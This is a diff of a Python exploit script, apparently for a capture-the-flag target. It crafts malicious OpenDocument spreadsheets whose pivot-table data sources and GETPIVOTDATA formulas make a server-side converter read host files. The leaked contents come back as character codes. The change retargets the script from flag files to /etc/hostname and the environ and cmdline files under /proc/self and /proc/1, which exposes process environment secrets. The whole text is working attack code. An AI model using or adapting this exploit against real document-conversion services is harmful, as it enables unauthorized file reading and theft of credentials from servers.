@@ -275,8 +275,8 @@ def convert(data):
     print("PIVOT_DECODED", decoded, flush=True)
 
 
-def make_search_fods(candidates):
-    positions = list(range(1, 49))
+def make_search_fods(candidates, locate_flag=True, count=48):
+    positions = list(range(1, count + 1))
     rows = []
     pivots = []
     for index, (label, url, table) in enumerate(candidates):
@@ -288,7 +288,7 @@ def make_search_fods(candidates):
             formula = f'of:=GETPIVOTDATA("X{i}";[.{target_cell}])'
             cells.append(f'<table:table-cell table:formula="{html.escape(formula, quote=True)}" office:value-type="float" office:value="0"/>')
         rows.append(f'<table:table-row>{"".join(cells)}</table:table-row>')
-        pivots.append(pivot_definition(f'Pivot{index}', url, table, positions, target_range, locate_flag=True))
+        pivots.append(pivot_definition(f'Pivot{index}', url, table, positions, target_range, locate_flag=locate_flag))
     return f'''<?xml version="1.0" encoding="UTF-8"?>
 <office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
 <office:body><office:spreadsheet><table:table table:name="Sheet1">{''.join(rows)}</table:table>
@@ -306,7 +306,7 @@ def convert_search(candidates, data):
     for index, (label, _, _) in enumerate(candidates):
         cells = lines[index].split(',') if index < len(lines) else []
         codes = []
-        for cell in cells[:48]:
+        for cell in cells:
             try:
                 codes.append(int(float(cell.strip().strip('"'))))
             except ValueError:
@@ -317,28 +317,19 @@ def convert_search(candidates, data):
 
 def main():
     req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
-    root = source_url("d4")
     etc = source_url("d5")
-    proc_root = host_odb("proc1-root", "/proc/1/root")
-    proc_self = host_odb("proc-self", "/proc/self")
-    proc_one = host_odb("proc-one", "/proc/1")
-    tmp = host_odb("tmp-files", "/tmp")
-    app = host_odb("app-files", "/app")
+    proc_self = source_url("d9")
+    proc_one = source_url("d10")
+    proc_root_etc = host_odb("proc1-root-etc", "/proc/1/root/etc")
     candidates = [
-        ("root-flag.txt", root, "flag.txt"),
-        ("root-FLAG", root, "FLAG"),
-        ("proc1-root-flag", proc_root, "flag"),
+        ("etc-hostname", etc, "hostname"),
+        ("proc1-root-etc-hostname", proc_root_etc, "hostname"),
         ("proc-self-environ", proc_self, "environ"),
+        ("proc-self-cmdline", proc_self, "cmdline"),
         ("proc1-environ", proc_one, "environ"),
-        ("etc-environment", etc, "environment"),
-        ("etc-flag", etc, "flag"),
-        ("etc-flag.txt", etc, "flag.txt"),
-        ("tmp-flag", tmp, "flag"),
-        ("tmp-flag.txt", tmp, "flag.txt"),
-        ("app-flag", app, "flag"),
-        ("app-flag.txt", app, "flag.txt"),
+        ("proc1-cmdline", proc_one, "cmdline"),
     ]
-    convert_search(candidates, make_search_fods(candidates))
+    convert_search(candidates, make_search_fods(candidates, locate_flag=False, count=96))
 
 
 if __name__ == "__main__":
